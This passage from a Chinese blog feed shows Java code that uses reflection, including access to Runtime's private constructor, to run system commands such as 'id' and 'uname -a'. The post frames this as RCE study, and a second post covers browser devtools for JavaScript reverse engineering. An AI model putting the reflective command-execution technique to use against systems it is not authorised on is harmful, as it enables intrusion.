class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(isr);</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line=br.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-064914.png"                      alt="image-20230416144913760"                ></p><p>​    通过 class.getConstructor( parameterType ).newInstance(“parameter”) 来调用含有参数parameter的构造函数</p><p>​    由于 cmdarray 参数的类型是 List , 所以我们执行的命令的类型也必须是 List , 此时可以用 Arrays.asList() 方法将一个可变长参数或者数组转换成 List 类型 .</p><p>​    由于 start() 方法没有参数 , 所以直接调用 Method.invoke(obj) 就可以了</p><h4 id="执行携带参数的系统命令"><a href="#执行携带参数的系统命令" class="headerlink" title="执行携带参数的系统命令"></a>执行携带参数的系统命令</h4><p>​    那么如何执行携带参数的系统命令呢 ?</p><p>​    其实一共有两种方法来执行携带参数的系统命令 . 下面分别来说一下 .</p><ol><li><p><strong>public ProcessBuilder(List<String> command)</strong></p><p>这里还是通过 Arrays.asList() 方法 . 由于该方法的参数可以是一个可变长参数 , 所以我们可以直接把携带参数的系统命令写到一个数组中 , 然后通过该方法转换成列表 .</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">processBuilder2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">processBuilder2</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">startCmd</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;uname&quot;</span>,<span class="string">&quot;-a&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//执行start()方法</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> (Process) startCmd.invoke(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将进程p的标准输出流转化为输入字节流</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="comment">//字节流转化为字符流</span></span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(isr);</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line=br.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-070233.png"                      alt="image-20230416150233244"                ></p><p>​    这样就能成功执行携带参数的系统命令了 .</p><ol start="2"><li><strong>public ProcessBuilder(String… command)</strong></li></ol><p>​    这是上文所说的 ProcessBuilder 类的第二个构造函数 , 也就是专门用于执行携带参数的系统命令的构造函数 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-070554.png"                      alt="image-20230416150554549"                ></p><p>​    可以看到 , 该构造方法的参数是也是一个可变长参数 . 可变长参数代表着不定长度的参数 , 例如 String … parameter 代表参数 parameter 由不定个数的字符串组成 .</p><p>​    Java在编译时会将可变长参数编译成一个数组 . 所以下面两种写法是完全等价的 .</p><p>​    <strong>public void test(String[] names)<strong>等价于</strong>public void test(String … names)</strong></p><p>​    因此 , 我们可以将 String[].class 作为参数传递给 getConstructor() 方法 , 告诉 ProcessBuilder 调用第二个构造方法来处理携带参数的系统命令 .</p><p>​    这里其他大佬给出了范例</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-072150.png"                      alt="image-20230416152149929"                ></p><p>​        我们在刚刚的代码上修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">processBuilder3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">processBuilder3</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">startCmd</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;uname&quot;</span>,<span class="string">&quot;-a&quot;</span>&#125;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//执行start()方法</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> (Process) startCmd.invoke(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将进程p的标准输出流转化为输入字节流</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="comment">//字节流转化为字符流</span></span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(isr);</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line=br.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-072755.png"                      alt="image-20230416152755064"                ></p><h3 id="如何调用类的私有方法"><a href="#如何调用类的私有方法" class="headerlink" title="如何调用类的私有方法"></a>如何调用类的私有方法</h3><p>​    这个问题其实之前就遇到过了，在通过 java.lang.Runtime 执行系统命令时 , 由于该类的构造方法 Runtime() 是一个私有方法 , 所以我们不能调用该方法 , 只能通过 getRuntime() 静态方法来返回一个 Runtime 实例对象 , 然后再调用 exec() 方法 . 为此还提到了 “ 单例模式 “ 这种设计模式 .</p><p>​    也就是说 , 我们无法直接获取到私有构造方法的 . 那么是否有其他方法来获取私有构造方法 ?</p><p>​    java.lang.reflect.AccessibleObject.class 中存在这么一个方法 : setAccessible(boolean flag)</p><p>​    来看下官方文档中是怎么定义这个方法的 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-073932.png"                      alt="image-20230416153932113"                ></p><p>​    从中我们可以知道 , 当该方法的参数被设置为 True 时 , 会取消 Java 语言访问检查 , 也就是取消对 public , protected , private 等修饰符的检查 .</p><p>​    但是 , 如果对象是 java.lang.Class.Constructor , 那么将会抛出异常 . 也就是说 , 我们不能通过 getConstructor() 方法来获取构造方法 .这是为什么呢 ? 其实很好理解 , 与 getMethods() 和 getDeclaredMethods() 一个道理 , getConstructor() 方法只能获取当前类与其继承类的公用( public )方法 . 而不能获取私有方法 .</p><p>​    而我们现在需要获取的方法( Runtime() )是私有方法 , 自然不能通过 getConstructor() 方法来获取 .那怎么办呢 ? 其实我们可以使用 <strong>getDeclaredConstructor()</strong> 方法 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-074014.png"                      alt="image-20230416154014007"                ></p><p>​    <strong>该方法与 getConstructor() 方法最大的不同点在于 : 这个方法会返回指定参数类型的所有构造方法 . 包括 public , protected 以及 private 修饰符修饰的 .</strong></p><p>​    <strong>而 getConstructor() 方法只会返回所有构造方法的一个子集 , 即 public 修饰符修饰的 .</strong></p><p>​    因此 , 通过 getDeclaredConstructor() 方法 , 我们可以获取到私有构造方法 Runtime() . 并且 , 通过setAccessible(boolean flag)关闭 Java 语言访问检查时也不会再抛出异常 .</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//java.lang.Runtime</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Runtime</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Runtime</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//        System.out.println(&quot;通过Class.forname()方法获取任意类：&quot;+cls);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//className.getMethods()</span></span><br><span class="line">        System.out.println(<span class="string">&quot;getMethods获取方法:&quot;</span>);</span><br><span class="line">        Method[] methods = cls.getMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method m : methods) &#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//className.getDeclaredMethods()</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\ngetDeclaredMethods获取的方法&quot;</span>);</span><br><span class="line">        Method[] declareMethods = cls.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method m : methods) &#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        newInstance nis = (newInstance)cls.getDeclaredConstructor().newInstance();</span></span><br><span class="line"><span class="comment">//        Object obj = cls.getMethod(&quot;exec&quot;, String.class).invoke(nis,&quot;id&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">mGetRuntime</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">mExec</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> mGetRuntime.invoke(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> (Process) mExec.invoke(obj, <span class="string">&quot;id&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        通过 getDeclaredConstructor() 方法 ,</span></span><br><span class="line"><span class="comment">        我们可以获取到私有构造方法 Runtime() .</span></span><br><span class="line"><span class="comment">        并且 , 通过setAccessible(boolean flag)</span></span><br><span class="line"><span class="comment">        关闭 Java 语言访问检查时也不会再抛出异常</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Constructor&lt;?&gt; cst = cls.getDeclaredConstructor();</span><br><span class="line">        cst.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> cst.newInstance();</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p2</span> <span class="operator">=</span> (Process) mExec.invoke(obj2, <span class="string">&quot;id&quot;</span>);</span><br><span class="line">        <span class="comment">//标准输出当作输入字节流</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is2</span> <span class="operator">=</span> p2.getInputStream();</span><br><span class="line">        <span class="comment">//字节流转换为字符流</span></span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">isr2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is2);</span><br><span class="line">        <span class="comment">//提供缓冲区</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(isr2);</span><br><span class="line">        <span class="type">String</span> <span class="variable">line2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line2 = br2.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-074346.png"                      alt="image-20230416154346206"                ></p><p>​    <strong>通过 getDelclaredConstructor() 方法获取到 Runtime() 构造方法 , 关闭 Java 语言访问检查 , 然后构建实例对象 . 最后通过 Method.invoke(obj , parameter) 调用 exec() 方法 .</strong></p><p>​    通过这种方法 , 就可以直接访问任意类的私有构造方法了.</p><p>​    RCE就总结这么多，持续学习 . 感谢各位大牛的资料</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    上一篇学习了Java反射机制，这篇学习一下RCE，将 Java反射与RCE方式结合在一起。&lt;/p&gt;
&lt;h3 id=&quot;Java-lang-Runtime&quot;&gt;&lt;a href=&quot;#Java-lang-Runtime&quot; class=&quot;headerlink&quot; title=&quot;</summary>
      
    
    
    
    <category term="Java安全基础篇" scheme="http://example.com/categories/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    
    
    <category term="开发" scheme="http://example.com/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
    <category term="反射" scheme="http://example.com/tags/%E5%8F%8D%E5%B0%84/"/>
    
    <category term="RCE" scheme="http://example.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>Python爬虫从一到二(JS逆向)</title>
    <link href="http://example.com/2022/10/09/Python%E7%88%AC%E8%99%AB%E4%BB%8E%E4%B8%80%E5%88%B0%E4%BA%8C-JS%E9%80%86%E5%90%91/"/>
    <id>http://example.com/2022/10/09/Python%E7%88%AC%E8%99%AB%E4%BB%8E%E4%B8%80%E5%88%B0%E4%BA%8C-JS%E9%80%86%E5%90%91/</id>
    <published>2022-10-08T16:38:07.000Z</published>
    <updated>2023-04-15T07:44:20.252Z</updated>
    
    <content type="html"><![CDATA[<p>​    可先看从零到一，无前言</p><h3 id="浏览器开发者工具F12"><a href="#浏览器开发者工具F12" class="headerlink" title="浏览器开发者工具F12"></a>浏览器开发者工具F12</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073444.png"                      alt="image-20221009081737698"                ></p><ul><li><strong>Elements（元素面板）</strong>：使用“元素”面板可以通过自由操纵 DOM 和 CSS 来重您网站的布局和设计。</li><li><strong>Console（控制台面板）</strong>：在开发期间，可以使用控制台面板记录诊断信息，或者使用它作为 shell，在页面上与 JavaScript 交互。</li><li><strong>Sources（源代码面板）</strong>：在源代码面板中设置断点来调试 JavaScript ，或者通过 Workspaces（工作区）连接本地文件来使用开发者工具的实时编辑器。</li><li><strong>Network（网络面板）</strong>：从发起网页页面请求 Request 后得到的各个请求资源信息（包括状态、资源类型、大小、所用时间等），并可以根据这个进行网络性能优化。</li><li><strong>Performance（性能面板）</strong>：使用时间轴面板，可以通过记录和查看网站生命周期内发生的各种事件来提高页面运行时的性能。</li><li><strong>Memory（内存面板）</strong>：分析 web 应用或者页面的执行时间以及内存使用情况。</li><li><strong>Application（应用面板）</strong>：记录网站加载的所有资源信息，包括存储数据（Local Storage、 Session Storage、IndexedDB、Web SQL、Cookies）、缓存数据、字体、图片、脚本、样式 表等。</li><li><strong>Security（安全面板）</strong>：使用安全面板调试混合内容问题，证书问题等等。</li><li><strong>Lighthouse（诊断面板）</strong>：对当前网页进行网络利用情况、网页性能方面的诊断，并给出一些优化 建议。</li><li><strong>元素选择</strong>：可以直接点击页面的元素，会自动跳转到对应的源代码</li><li><strong>终端模拟</strong>：模拟各种终端设备，支持自定义终端。</li><li><strong>自定义</strong>：自定义和控制开发者工具，包括调整工具的位置、全局搜索、运行命令、其他工具等。</li></ul><h4 id="终端模拟"><a href="#终端模拟" class="headerlink" title="终端模拟"></a>终端模拟</h4><p>​    点击可以模拟各种终端设备，适合查看手机页面的数据，点击【More tools】—&gt; 【Sensors】可以模拟终端的地理位置、终端朝向等；工具栏可以选择要模拟的终端型号，其中 Responsive 是自适应。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073447.png"                      alt="image-20221009082638963"                ></p><h4 id="Network面板"><a href="#Network面板" class="headerlink" title="Network面板"></a>Network面板</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073448.png"                      alt="image-20221009082842623"                ></p><h5 id="Controls控制器"><a href="#Controls控制器" class="headerlink" title="Controls控制器"></a>Controls控制器</h5><p>​    Preserve log：是否在页面重加载后，清除请求列表。</p><p>​    Disable cache：是否启用缓存。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073452.png"                      alt="image-20221009083048308"                >是否开启抓包。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073454.png"                      alt="image-20221009083119445"                >清除请求。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73455.png"                      alt="image-20221009083200333"                >是否隐藏 Filter（过滤器)窗格。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073456.png"                      alt="image-20221009083249902"                >Network conditions，网络条件，允许在各种网络环境中测试网站，包括 3G，离线等，还可以自定义限制最大下载和上传流量。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73457.png"                      alt="image-20221009083328277"                >Import/Export HAR file，导入导出抓包数据。</p><h5 id="Filter过滤器"><a href="#Filter过滤器" class="headerlink" title="Filter过滤器"></a>Filter过滤器</h5><ul><li><strong>Hide data URLs</strong>：data URLs 指一些嵌入到文档中的小型文件，在请求表里面以 data: 开头的文件就是，如较为常见的 svg 文件。勾选 Hide data URLs复选框即可隐藏此类文件。</li><li><strong>All</strong>：显示所有请求。</li><li><strong>XHR</strong>：全称 XMLHttpRequest，是一种创建 AJAX 请求的 JavaScript API，通常抓取 Ajax 请求可以选择 XHR。</li><li><strong>WS</strong>：全称 WebSocket，是 HTML5 开始提供的一种在单个 TCP 连接上进行全双工通讯的协议。</li><li><strong>Manifest</strong>：安卓开发文件名，属于 AndroidManifest.xml 文件，在简单的 Android 系统的应用中提出了重要的信息码。</li><li><strong>Has blocked cookies</strong>：仅显示具有阻止响应 cookie 的请求。</li><li><strong>Blocked Requests</strong>：只显示被阻止的请求。</li></ul><h4 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073459.png"                      alt="image-20221009152041493"                ></p><ol><li>Ctrl+Shift+F 或者右上角三个点打开全局搜索，搜索关键字。</li><li>定位到可疑代码，点击行号埋下断点。</li><li>调试代码，分析逻辑，其中 console 模板可以直接编写 JS 代码进行调试。</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073500.png"                      alt="image-20221009163316301"                >执行到下一个断点。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73503.png"                      alt="image-20221009163406210"                >执行下一步，不会进入所调用的函数内部</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073503.png"                      alt="image-20221009163446381"                >进入所调用的函数内部</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073505.png"                      alt="image-20221009163513211"                >跳出函数内部</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073508.png"                      alt="image-20221009163544086"                >一步步执行代码，遇到有函数调用，则进入函数</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073509.png"                      alt="image-20221009163619030"                >停用断点</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073510.png"                      alt="image-20221009163653727"                >不要在出现异常时暂停</p><p>​    <strong>Breakpoints</strong>：可以看到已经埋下的断点。</p><p>​    <strong>Scope</strong>：可以看到当前局部或者全局变量的值，可对值进行修改。</p><p>​    <strong>Call Stack</strong>：可以看到当前代码调用的堆栈信息，代码执行顺序为由下至上。</p><h5 id="XHR断点"><a href="#XHR断点" class="headerlink" title="XHR断点"></a>XHR断点</h5><p>​    匹配 url 中关键词，匹配到则跳转到参数生成处，适用 于url中的加密参数全局搜索搜不到，可采用这种方式拦截。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073513.png"                      alt="image-20221009163911378"                ></p><h5 id="行为断点"><a href="#行为断点" class="headerlink" title="行为断点"></a>行为断点</h5><p>​    Event Listener Breakpoints，事件侦听器断点，当鼠标点击、移动、键盘按键等行为或者其他事件发生时可以触发断点，比如 Mouse —&gt; click，可快速定位点击按钮后，所执行的 JS。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073514.png"                      alt="image-20221009164629868"                ></p><h4 id="插入JS"><a href="#插入JS" class="headerlink" title="插入JS"></a>插入JS</h4><p>​    在 sources —&gt; snippets 下可以新建 JS 脚本。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073515.png"                      alt="image-20221009165526791"                ></p><h4 id="打印windows对象的值"><a href="#打印windows对象的值" class="headerlink" title="打印windows对象的值"></a>打印windows对象的值</h4><p>​    在 console 中输入如下代码，如只打印 <code>_$</code> 开头的变量值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">in</span> <span class="variable language_">window</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (p.<span class="title function_">substr</span>(<span class="number">0</span>, <span class="number">2</span>) !== <span class="string">&quot;_$&quot;</span>) </span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p + <span class="string">&quot; &gt;&gt;&gt; &quot;</span> + <span class="built_in">eval</span>(p))</span><br><span 